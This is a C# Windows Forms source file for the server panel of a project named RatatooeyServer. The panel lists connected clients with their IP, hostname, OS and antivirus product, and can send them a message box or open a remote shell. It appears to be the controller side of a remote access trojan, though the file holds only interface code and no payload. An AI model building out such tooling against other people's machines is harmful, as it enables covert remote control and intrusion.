using System.Windows.Forms;
using System;
using RatatooeyServer.Server;
using System.Linq;
using RatatooeyServer.ProtoMessages;


namespace RatatooeyServer
{

	public partial class FormServer : Form
	{
		Server.Server server;
		private void InvokeIfRequired(Action action)
		{
			if (InvokeRequired)
			{
				Invoke(action);
			}
			else
			{
				action();
			}
		}

		public FormServer()
		{
			InitializeComponent();
			server = new Server.Server(this);
			server.Start();
		}
		public void RemoveClientList(Client client)
		{

			InvokeIfRequired(() =>
			{
				var itemToRemove = clientsList.Items.Cast<ListViewItem>()
										.FirstOrDefault(item => item.Tag is Client cl && cl == client);
				clientsList.Items.Remove(itemToRemove);
			});
		}

		public void AddClientToList(Client client)
		{
			if (client == null)
				return;

			// Create a ListViewItem and set its Tag property to the Client object
			ListViewItem item = new ListViewItem(client.data.IP.Address.ToString());
			item.Tag = client;

			// Add sub-items for the client data
			item.SubItems.Add(client.data.Hostname);
			item.SubItems.Add(client.data.OS);
			item.SubItems.Add(client.data.AV);

			// Check if invoking is required
			InvokeIfRequired(() =>
			{
				// Add the ListViewItem to the ListView
				clientsList.Items.Add(item);
			});
		}

		private void FormServer_Load(object sender, EventArgs e)
		{

		}

		private void tableLayoutPanel1_Paint(object sender, PaintEventArgs e)
		{

		}
		private Client GetSelectedClients()
		{
			Client client = null;

			clientsList.Invoke((MethodInvoker)delegate
			{
				if (clientsList.SelectedItems.Count == 0) return;
				client = (
					clientsList.SelectedItems.Cast<ListViewItem>()
						.Where(item => item != null)
						.Select(item => item.Tag as Client).First());
			});

			return client;
		}
		private void administrationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			//MessageBox.Show(GetSelectedClients().data.Hostname);
			GetSelectedClients().SendData(new MsgBox() { Text = "Hello!" });
		}

		private void shellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			RemoteShellForm frmShl = new RemoteShellForm(GetSelectedClients());
			frmShl.Show();
			//server.OnSendMessage(GetSelectedClients(),);
		}

		private void clientsList_MouseClick(object sender, MouseEventArgs e)
		{
			if (clientsList.Items.Count == 0) return;

			if (e.Button == MouseButtons.Right)
			{
				var focusedItem = clientsList.FocusedItem;
				if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
				{
					contextMenuStrip.Show(Cursor.Position);
				}
			}
		}

		private void clientsList_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (clientsList.SelectedItems.Count > 0)
			{
				
			}
				
		}

	}
}
